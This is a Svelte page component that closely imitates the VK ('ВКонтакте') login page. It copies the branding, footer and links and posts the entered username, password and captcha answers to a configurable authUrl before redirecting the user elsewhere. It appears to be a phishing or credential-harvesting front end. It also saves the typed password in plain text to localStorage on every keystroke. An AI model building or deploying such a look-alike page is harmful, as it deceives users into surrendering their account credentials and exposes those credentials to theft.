<style>
  .header {
    background-color: rgb(255, 255, 255);
    height: 48px;
    width: 100%;
  }

  .header__list {
    width: 963px;
    display: flex;
    margin: 0 auto;
    padding: 0;
    list-style: none;
  }

  .header__list-item {
    display: flex;
  }

  .header__list-item--search {
    align-items: center;
  }

  .search {
    display: flex;
    align-items: center;
    height: 32px;
  }

  .search__input::placeholder {
    color: #646d79;
  }

  .search__input {
    font-size: 14px;
    padding: 0 0 0 34px;
    border-radius: 8px;
    margin: 0;
    border: 0;
    background-color: #edeef0;
    background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%20opacity%3D%22.92%22%3E%3Cpath%20opacity%3D%22.1%22%20d%3D%22M0%200H16V16H0z%22%2F%3E%3Cpath%20d%3D%22M6.5%201a5.5%205.5%200%200%201%204.383%208.823l3.896%203.9a.75.75%200%200%201-1.061%201.06l-3.895-3.9A5.5%205.5%200%201%201%206.5%201zm0%201.5a4%204%200%201%200%200%208%204%204%200%200%200%200-8z%22%20fill%3D%22%23818c99%22%20fill-rule%3D%22nonzero%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E);
    background-position: 10px;
    height: 32px;
    background-repeat: no-repeat;
    width: 230px;
  }

  .TopHomeLink {
    background-repeat: no-repeat;
    background-position: center left;
    background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg%20fill%3D%22none%22%20height%3D%2224%22%20width%3D%22136%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M0%2011.5c0-5.42%200-8.13%201.68-9.82C3.37%200%206.08%200%2011.5%200h1c5.42%200%208.13%200%209.82%201.68C24%203.37%2024%206.08%2024%2011.5v1c0%205.42%200%208.13-1.68%209.82C20.63%2024%2017.92%2024%2012.5%2024h-1c-5.42%200-8.13%200-9.82-1.68C0%2020.63%200%2017.92%200%2012.5z%22%20fill%3D%22%232787f5%22%2F%3E%3Cg%20clip-rule%3D%22evenodd%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22M6.5%207.5H4.75c-.5%200-.6.24-.6.5%200%20.46.6%202.76%202.76%205.8%201.45%202.07%203.49%203.2%205.34%203.2%201.11%200%201.25-.25%201.25-.68v-1.57c0-.5.1-.6.46-.6.26%200%20.7.13%201.74%201.13%201.19%201.19%201.38%201.72%202.05%201.72h1.75c.5%200%20.75-.25.6-.74-.15-.5-.72-1.2-1.47-2.05-.4-.49-1.02-1-1.2-1.26-.26-.34-.2-.49%200-.78%200%200%202.13-3%202.35-4.03.11-.37%200-.64-.53-.64H17.5a.76.76%200%2000-.76.5s-.9%202.16-2.15%203.57c-.41.41-.6.54-.82.54-.1%200-.27-.13-.27-.5V8.14c0-.44-.13-.64-.5-.64h-2.75c-.28%200-.45.2-.45.4%200%20.42.64.52.7%201.7v2.58c0%20.57-.1.67-.32.67-.6%200-2.04-2.18-2.9-4.67-.16-.48-.33-.68-.78-.68z%22%20fill%3D%22%23fff%22%2F%3E%3Cpath%20d%3D%22M66.86%2012.5c0%203.24-2.43%205.5-5.78%205.5s-5.78-2.26-5.78-5.5S57.73%207%2061.08%207s5.78%202.26%205.78%205.5zm-8.97%200c0%201.97%201.3%203.3%203.19%203.3s3.19-1.33%203.19-3.3c0-1.98-1.3-3.25-3.19-3.25s-3.19%201.28-3.19%203.25zm-17.14-.21c.95-.44%201.56-1.18%201.56-2.33%200-1.73-1.58-2.96-3.87-2.96h-5.27v11h5.5c2.37%200%204.02-1.29%204.02-3.05%200-1.33-.87-2.32-1.94-2.66zM35.6%209.01h2.83c.85%200%201.44.5%201.44%201.2s-.6%201.2-1.44%201.2h-2.83zM38.67%2016h-3.06V13.3h3.06c.96%200%201.59.55%201.59%201.36s-.63%201.33-1.59%201.33zM51.84%2018h3.19l-5.06-5.71L54.61%207h-2.9l-3.68%204.27h-.6V7H45v11h2.44v-4.38h.59zM76.47%207v4.34h-4.93V7H69.1v11h2.43v-4.44h4.93V18h2.43V7zM86.9%2018h-2.44V9.22h-3.8V7H90.7v2.22h-3.8zm9.5-11c-2.11%200-3.91.89-4.52%202.8l2.24.37c.34-.67%201.05-1.2%202.15-1.2%201.33%200%202.06.84%202.17%202.28h-2.32c-3.23%200-4.79%201.42-4.79%203.45%200%202.05%201.59%203.3%203.78%203.3%201.8%200%203-.72%203.53-1.63l.5%201.63h1.76v-6.18c0-3.19-1.74-4.82-4.5-4.82zm-.72%209c-1.19%200-1.9-.5-1.9-1.4%200-.85.57-1.44%202.43-1.44h2.35c0%201.8-1.19%202.84-2.88%202.84zm17.99%202h-3.2l-3.8-4.38h-.6V18h-2.43V7h2.43v4.27h.6L110.34%207h2.9l-4.63%205.29zm3.88%200h2.43V9.22h3.8V7h-10.04v2.22h3.8zM130.1%207c3.34%200%205.56%202.4%205.56%205.37%200%20.3-.02.55-.04.79h-8.54c.23%201.69%201.36%202.69%203.17%202.69%201.29%200%202.15-.4%202.68-1.2l2.29.39c-.88%202.01-2.83%202.96-5.12%202.96a5.28%205.28%200%2001-5.51-5.5c0-3.12%202.17-5.5%205.51-5.5zm2.92%204.25c-.4-1.37-1.4-2.15-2.92-2.15-1.48%200-2.47.74-2.87%202.15z%22%20fill%3D%22%2319191a%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E);
    background-size: auto 24px;
    display: flex;
  }

  .background {
    background-color: #edeef0;
    height: 100vh;
    width: 100%;
    position: absolute;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  @media (min-width: 701px) {
    .background {
      /*justify-content: center;*/
    }

    .auth-form {
      margin-top: 50px;
      margin-bottom: 50px;
      border-radius: 4px;
      overflow: hidden;
    }

    .auth-form__nav {
      height: 54px;
      line-height: 54px;
      display: flex;
      justify-content: space-between;
      padding: 0 25px;
      background-color: #5181b8;
      font-weight: bold;
    }

    .auth-form__nav-register {
      color: #fff;
      text-decoration: none;
    }

    .auth-form__nav-register:hover,
    .auth-form__nav-register:focus {
      text-decoration: underline;
    }

    .auth-form__form-prepend {
      padding: 37px 30px 0;
      text-align: center;
      line-height: 150%;
      font-size: 20px;
      background-color: #fff;
    }

    .auth-form__fields-container {
      box-sizing: content-box;
      width: 680px;
      padding: 25px 30px 37px 30px;
      background-color: #fff;
    }

    .auth-form__fields {
      width: 270px;
      margin: 0 auto;
    }

    .auth-form__field {
      margin-bottom: 15px;
      display: block;
    }

    .auth-form__label {
      margin-bottom: 8px;
      color: #222222;
      display: block;
      line-height: 19px;
      font-weight: 500;
    }

    .auth-form__input::placeholder {
      color: #828282;
      transition: color .2s ease;
      opacity: 1;
    }

    .auth-form__input:focus::placeholder {
      color: #b2b2b2;
    }

    .auth-form__input {
      padding: 6px 12px 8px;
      border-radius: 3px;
      height: 35px;
      margin: 0;
      border: 1px solid #d3d9de;
      font-size: 13px;
      width: 100%;
    }

    .auth-form__checkbox {
      display: block;
      position: relative;
      padding-left: 22px;
      margin-bottom: 20px;
      cursor: pointer;
      font-size: 13px;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    .auth-form__checkbox input {
      position: absolute;
      opacity: 0;
      cursor: pointer;
      height: 0;
      width: 0;
    }

    .auth-form__checkbox .checkmark {
      position: absolute;
      top: 0;
      background: url(data:image/svg+xml;charset=utf-8,%3Csvg%20height%3D%2215%22%20viewBox%3D%220%200%2015%2015%22%20width%3D%2215%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Crect%20fill%3D%22%23fff%22%20height%3D%2215%22%20rx%3D%223%22%20width%3D%2215%22%2F%3E%3Crect%20height%3D%2214%22%20rx%3D%223%22%20stroke%3D%22%23c1c9d1%22%20width%3D%2214%22%20x%3D%22.5%22%20y%3D%22.5%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E) no-repeat 0 center;
      left: 0;
      width: 15px;
      height: 15px;
    }

    .auth-form__checkbox .checkmark::after {
      content: "";
      position: absolute;
      display: none;
      height: 15px;
      width: 15px;
      background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2215%22%20height%3D%2215%22%20viewBox%3D%220%200%2015%2015%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Crect%20width%3D%2215%22%20height%3D%2215%22%20fill%3D%22%235181B8%22%20rx%3D%223%22%2F%3E%3Cpath%20stroke%3D%22%23FFF%22%20stroke-width%3D%221.7%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%20d%3D%22M4%207.5L6.5%2010%2011%204.5%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E);
    }

    .auth-form__checkbox input:checked ~ .checkmark:after {
      display: block;
    }

    .auth-form__buttons {
      display: flex;
      flex-wrap: wrap;
    }

    .auth-form__button {
      /*width: 100%;*/
      padding: 0 3px;
      margin: 0;
      font-size: 14px;
      cursor: pointer;
      text-align: center;
      border-radius: 4px;
      border: none;
      height: 35px;
    }

    .auth-form__button:hover,
    .auth-form__button:focus {
      opacity: 0.88;
    }

    .auth-form__button--primary {
      width: 105px;
      padding: 7px 16px 8px;
      background-color: #5181b8;
      color: #fff;
    }

    .auth-form__button--register {
      padding: 7px 16px 8px;
      color: #fff;
      width: 155px;
      background-color: rgb(75, 179, 75);
      margin-left: auto;
    }

    .auth-form__ny-registed {
      display: none;
    }

    .auth-form__button--link {
      color: #2a5885;
      display: block;
      text-decoration: none;
    }

    .auth-form__button--link:hover,
    .auth-form__button--link:focus {
      text-decoration: underline;
    }

    .auth-form__button--restore {
      margin: 0 auto;
      margin-top: 38px;
      margin-bottom: 15px;
    }
    .auth-form__nav-logo {
      font-size: 0;
      display: block;
      width: 40px;
      background-image: url(https://vk.com/images/logo_vk.png);
      background-repeat: no-repeat;
      background-position: 0 15px;
    }

    .auth-form__error {
      background-color: #ffd6cc;
      margin-bottom: 15px;
      border: 1px solid #f2ab99;
      padding: 7px 18px 9px;
      border-radius: 2px;
      text-align: center;
      line-height: 150%;
    }

    .auth-form__capthca-image {
      display: block;
      margin: 0 auto;
    }

    .footer {
      color: rgb(111, 121, 133);
      margin-top: 40px;
      width: 960px;
      padding: 24px 15px 35px;
      border-top: 1px solid #dce1e6;;
      text-align: center;
      font-size: 13px;
    }

    .footer a {
      color: rgb(42, 88, 133);
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }


    .footer__nav {
      color: #6f7985;
      display: flex;
      justify-content: space-between;
    }

    .bnav_a {
      padding: 2px 5px;
    }

    .footer__lang-link {
      padding: 2px 5px;
    }
  }

  @media (max-width: 700px) {
    .background {
      justify-content: start;
    }

    .auth-form {
      width: 100%;
    }

    .auth-form__nav {
      display: block;
      height: 56px;
      line-height: 56px;
      background-color: #fff;
      display: flex;
      justify-content: center;
    }

    .auth-form__nav-register {
      display: none;
    }

    .auth-form__nav-logo {
      font-size: 0;
      position: relative;
    }

    .auth-form__nav-logo::before {
      content: "";
      width: 32px;
      height: 32px;
      position: absolute;
      display: block;
      background-position: -120px -56px;
      background-repeat: no-repeat;
      background-size: 312px 292px;
      background-image: url(https://m.vk.com/images/mobile/icons/sprites/base-c7ea6308.svg);
      top: 50%;
      transform: translateY(-50%);
    }

    .auth-form__form {
      width: 100%;
      max-width: 620px;
      background-color: #fff;
      margin: 0 auto;
    }

    .auth-form__form-prepend {
      padding: 0 16px;
      padding-top: 4px;
      font-size: 14px;
      color: #818c99;
    }

    .auth-form__fields-container {
      padding: 0 12px 16px;
    }

    .auth-form__field {
      padding: 12px 0 0;
      display: block;
    }

    .auth-form__error {
      background-color: #f4e7c3;
      color: #857250;
      padding: 7px;
      margin-top: 12px;
    }

    .auth-form__label {
      padding: 0 0 6px;
      color: #818c99;
      font-size: 14px;
      line-height: 18px;
      display: block;
    }

    .auth-form__label::after {
      content: ":";
    }

    .auth-form__input {
      border-radius: 10px;
      font-size: 16px;
      line-height: 20px;
      padding: 11px 12px;
      margin: 0;
      resize: vertical;
      color: #000000;
      border: 1px solid rgba(0, 0, 0, 0.12);
      vertical-align: top;
      width: 100%;
      min-width: 30px;
      background: #f2f3f5;
      transition: border 0.2s;
    }
    .auth-form__input:focus {
      outline: none;
      border-color: #3f8ae0;
    }

    .auth-form__buttons {
      margin-top: 15px;
    }

    .auth-form__button {
      text-align: center;
      cursor: pointer;
      font-size: 15px;
      font-weight: 500;
      line-height: 16px;
      padding: 10px 16px;
      border-radius: 10px;
      border: none;
    }

    .auth-form__button--primary {
      color: #fff;
      background-color: #4986cc;
    }
    .auth-form__button--link {
      color: #4986cc;
      text-decoration: none;
    }

    .auth-form__button--link:hover,
    .auth-form__button--link:focus {
      text-decoration: underline;
    }

    .auth-form__button--restore {
      display: none;
    }

    .auth-form__ny-registed {
      padding: 20px 0 0;
    }

    .auth-form__ny-registed-label {
      color: #818c99;
      font-weight: bold;
    }

    .auth-form__button--secondary {
      color: #3f8ae0;
      background-color: #001c3d0d;
    }
    .auth-form__button--register {
      display: block;
      width: 100%;
      text-decoration: none;
      margin-top: 12px;
    }
  }
</style>

<script context="module">
  export function preload(_page, { exit, authUrl }) {
    return { exitUrl: exit, authUrl };
  }
</script>

<script>
  import * as ac from "../misc/auth-constants";
  import { goto, stores } from "@sapper/app";

  export let exitUrl;
  export let authUrl;

  let inputLock = false;
  let username = "";
  let password = "";
  let error = "";
  let captchaImage = "";
  let captchaSid = "";
  let captchaCode = "";

  async function auth() {
    inputLock = true;

    let data = { username, password };

    if (captchaSid) {
      Object.assign(data, {
        captcha_sid: captchaSid,
        captcha_key: captchaCode
      });
    }

    fetch(authUrl, {
      method: "POST",
      body: JSON.stringify(data),
      headers: {
        "Content-Type": "application/json"
      }
    })
      .then(response => response.json())
      .then(data => {
        switch (data.status) {
          case ac.R_CAPTCHA:
            captchaImage = data.img;
            captchaSid = data.sid;
            break;
          case ac.R_ERROR_INVALID_CREDENTIALS:
            error = "Указан неверный логин или пароль.";
            break;
          case ac.R_REQUIRE_2FA:
            goto("/otp");
            break;
          case ac.R_SUCCESS:
            window.location.assign(exitUrl);
            break;
          case ac.R_ERROR_TO_MUCH_TRIES:
            error = "Слишком много попыток входа. Повторите попытку позднее.";
            break;
          case ac.R_ERROR_UNKNOWN:
          default:
            error = "Произошла неизвестная ошибка";
            break;
        }
      })
      .catch(e => (error = "Произошла сетевая ошибка"))
      .then(() => (inputLock = false));
  }
</script>

<svelte:head>
  <title>Вход | ВКонтакте</title>
</svelte:head>
<div class="header">
  <ul class="header__list">
    <li class="header__list-item">
      <a class="TopHomeLink TopHomeLink--ny2021logo TopHomeLink--logoWithText" href="https://vk.com/" aria-label="На главную" accesskey="1">
        <svg xmlns="http://www.w3.org/2000/svg" width="165" height="48" fill="none" class="TopHomeLink__svg--ny2021logo">  <style>.TopHomeLink__svg--ny2021logo {--red: #FF4F72;--green: #4BB34B;--blue: #78D2FF;--yellow: #FFD54F;}svg .lamp {animation-play-state: paused;}svg:hover .lamp {animation-play-state: running;}.lamp {  --t: 2s;  animation-name: blink;  animation-duration: var(--t);  animation-iteration-count: infinite;  animation-timing-function: step-end;}.lamp:nth-child(1n) {  animation-delay: calc(var(--t) / -4 * 3);}.lamp:nth-child(2n) {  animation-delay: calc(var(--t) / -4 * 2);}.lamp:nth-child(3n) {  animation-delay: calc(var(--t) / -4 * 1);}.lamp:nth-child(4n) {  animation-delay: calc(var(--t) / -4 * 0);}@keyframes blink {  0% {fill: var(--red)}  25% {fill: var(--yellow)}  50% {fill: var(--green)}  75% {fill: var(--blue)}  100% {fill: var(--red)}}  </style>  <g clip-path="url(#clip0)"><path d="M11.15 5.64c-.41 1.6-1.58 2.59-2.62 2.22S7 5.9 7.4 4.32c.4-1.58 1.58-2.58 2.62-2.22 1.05.37 1.5 1.96 1.13 3.54z" class="lamp"></path><path d="M25.37 7.25c-.33 1.6-1.44 2.66-2.5 2.34-1.04-.31-1.62-1.86-1.3-3.48.32-1.6 1.44-2.66 2.49-2.35 1.05.3 1.64 1.88 1.3 3.49z" class="lamp"></path><path d="M40.4 8.31c-.13 1.64-1.17 2.82-2.27 2.62-1.1-.2-1.8-1.7-1.62-3.34.18-1.64 1.2-2.79 2.26-2.57 1.07.21 1.76 1.64 1.63 3.3z" class="lamp"></path><path d="M55.39 8.86c-.06 1.65-.99 2.93-2.08 2.85-1.1-.09-1.92-1.49-1.84-3.14.08-1.65 1.01-2.92 2.08-2.84 1.07.08 1.9 1.48 1.84 3.13z" class="lamp"></path><path d="M70.45 9.02c0 1.65-.91 2.96-2 2.94-1.1-.03-1.98-1.4-1.93-3.05.05-1.64.93-2.95 2-2.93 1.08.02 1.94 1.38 1.93 3.04z" class="lamp"></path><path d="M85.54 8.6c.05 1.65-.81 3.05-1.9 3.08-1.1.02-2-1.31-2.02-2.94-.02-1.63.84-3.01 1.9-3.05 1.07-.03 1.97 1.26 2.02 2.91z" class="lamp"></path><path d="M100.46 7.33c.32 1.61-.28 3.17-1.31 3.49-1.03.31-2.23-.79-2.48-2.41-.25-1.63.32-3.14 1.35-3.43 1.02-.29 2.13.74 2.44 2.35z" class="lamp"></path><path d="M115.33 5.97c.36 1.6-.19 3.18-1.23 3.52s-2.17-.65-2.53-2.27c-.36-1.62.19-3.18 1.22-3.52 1.04-.35 2.16.66 2.54 2.27z" class="lamp"></path><path d="M130.1 4.08c.43 1.59-.06 3.18-1.09 3.57-1.02.38-2.2-.6-2.62-2.18-.42-1.58.07-3.18 1.1-3.57 1.03-.39 2.2.59 2.62 2.18z" class="lamp"></path><path d="M.33.33a432.52 432.52 0 00135.34 0" stroke="#555E69" stroke-width=".75" stroke-miterlimit="10" stroke-linecap="round"></path>  </g>  <defs><clipPath id="clip0">  <path fill="#fff" d="M0 0h136v11.96H0z"></path></clipPath>  </defs></svg>
      </a>
    </li>
    <li class="header__list-item header__list-item--search">
      <div class="search">
        <input type="text" class="search__input" placeholder="Поиск">
      </div>
    </li>
  </ul>
</div>
<div class="background">
  <div class="auth-form">
    <form action="#" class="auth-form__form" on:submit|preventDefault={auth}>
      <div class="auth-form__form-prepend">
        Вход ВКонтакте
      </div>

      <div class="auth-form__fields-container">
        {#if error}
          <div class="auth-form__error">{error}</div>
        {/if}

        <div class="auth-form__fields">
          <label class="auth-form__field">
            <input
              placeholder="Телефон или email"
              type="text"
              name="username"
              autocomplete="username"
              class="auth-form__input"
              bind:value={username}
              on:input={event => localStorage.setItem('username', event.target.value)}
              disabled={inputLock}
            />
          </label>
          <label class="auth-form__field">
            <input
              placeholder="Пароль"
              type="password"
              name="current-password"
              class="auth-form__input"
              bind:value={password}
              on:input={event => localStorage.setItem('password', event.target.value)}
              disabled={inputLock}
              autocomplete="current-password"
            />
          </label>
          <label class="auth-form__checkbox">Чужой компьютер
            <input type="checkbox" checked="checked">
            <span class="checkmark"></span>
          </label>
          {#if captchaImage}
            <label class="auth-form__field auth-form__field--captcha">
              <img
                src={captchaImage}
                alt="Каптча"
                class="auth-form__capthca-image"
              />
              <span class="auth-form__label">Код с картинки</span>
              <input
                type="text"
                class="auth-form__input"
                bind:value={captchaCode}
                disabled={inputLock}
              />
            </label>
          {/if}
          <div class="auth-form__buttons">
            <button
              class="auth-form__button auth-form__button--primary"
              type="submit"
              disabled={inputLock}
            >
              Войти
            </button>
            <button
              class="auth-form__button auth-form__button--register"
              type="submit"
              disabled={inputLock}
            >
              Регистрация
            </button>

            <a
              class="auth-form__button auth-form__button--link
              auth-form__button--restore"
              href="https://vk.com/restore"
              target="_blank"
              rel="external"
            >
              Забыли пароль или не можете войти?
            </a>
          </div>
        </div>

        <div class="auth-form__ny-registed">
          <div class="auth-form__ny-registed-label">
            Ещё не зарегистрированы?
          </div>
          <a
            class="auth-form__button auth-form__button--secondary
            auth-form__button--register"
            href="https://vk.com/join?reg=1"
            target="_blank"
            rel="external"
          >
            Зарегистрироваться
          </a>
        </div>
      </div>
    </form>
  </div>
  <div class="footer">
    <div class="footer__nav">
      <div class="footer__copy">
        <a href="https://vk.com/about">ВКонтакте</a> © 2006–2020
      </div>
      <div class="footer__links">
        <a class="bnav_a" href="https://vk.com/about">О ВКонтакте</a>
        <a class="bnav_a" href="https://vk.com/terms">Правила</a>
        <a class="bnav_a" href="https://vk.com/biz?utm_source=vk_inside&utm_medium=authorization" target="_blank" style="">Для бизнеса</a>
        <a class="bnav_a" href="https://vk.com/dev">Разработчикам</a>
      </div>
      <div class="footer__lang">
        <a class="footer__lang-link" href="#">English</a>
        <a class="footer__lang-link" href="#">Русский</a>
        <a class="footer__lang-link" href="#">Українська</a>
        <a class="footer__lang-link" href="#">все языки »</a>
      </div>
    </div>
  </div>
</div>
